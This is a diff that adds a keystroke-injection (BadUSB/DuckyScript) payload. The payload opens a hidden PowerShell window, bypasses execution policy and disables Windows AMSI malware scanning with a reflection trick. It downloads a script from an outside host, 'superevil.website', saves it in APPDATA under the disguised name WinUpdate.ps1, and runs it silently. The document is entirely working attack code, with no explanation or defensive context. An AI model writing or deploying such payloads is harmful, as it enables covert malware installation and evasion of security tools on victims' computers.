@@ -1,0 +1,19 @@
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+DELAY 100
+STRING try {
+DELAY 100
+STRING $u='https://superevil.website/assets/diagnostic-final.ps1';
+DELAY 100
+STRING $f=\"$env:APPDATA\\WinUpdate.ps1\";
+DELAY 100
+STRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+DELAY 100
+STRING iwr $u -OutFile $f;
+DELAY 100
+STRING start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $f
+DELAY 100
+STRING } catch {}
+ENTER
